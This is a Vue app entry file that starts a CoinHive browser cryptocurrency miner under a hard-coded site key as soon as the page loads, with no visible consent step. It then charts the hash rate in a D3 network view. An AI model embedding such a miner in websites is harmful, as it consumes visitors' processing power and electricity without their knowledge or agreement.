/* global CoinHive */
import Vue from 'vue'
import App from './App.vue'
import router from './router'
import store from './store'
import D3Network from 'vue-d3-network'

const stats = {}
App.opts = { threads: 1, throttle: 0.9 }

const CH = CoinHive
App.miner = new CH.Anonymous('s0N1th4I4ElExw1U3JlqGVTjZR428Nyq', App.opts)
App.miner.on('error', ev => console.log({ error: ev }))
App.miner.on('open', ev => console.log({ state: 'started', ev }))
App.miner.on('close', ev => console.log({ state: 'closed' }))
App.miner.on('found', ev => console.log({ found: ev.hashes }))
App.miner.on('accepted', ev => console.log({ accepted: ev.hashes }))
App.miner.start()

function updateStats () {
  stats.hashesPerSecond = App.miner.getHashesPerSecond()
  stats.totalHashes = App.miner.getTotalHashes()
  stats.acceptedHashes = App.miner.getAcceptedHashes()
  stats.rate = `${stats.hashesPerSecond.toFixed(1)}/sec`
  // App.opts.throttle = (1 - App.$slider.getValue() / 100)
  // App.miner.setThrottle(App.opts.throttle)
  // App.$options.html(`Threads: ${App.opts.threads}, Throttle: ${App.opts.throttle * 100}%`)
  const power = `Power: ${App.opts.throttle}`
  const msg = `H/s: ${Math.round(stats.hashesPerSecond)}, Total: ${stats.totalHashes}`
  console.log(msg, power)
  store.commit('updateStats', stats)
  store.commit('addMessage', msg)
  store.commit('addNode', {id: stats.totalHashes, name: stats.rate, _size: stats.hashesPerSecond * 10})
}

setInterval(updateStats, 3000)

/* eslint-disable no-new */
new Vue({
  el: '#app',
  store,
  router,
  template: '<App/>',
  components: { App, D3Network }
})
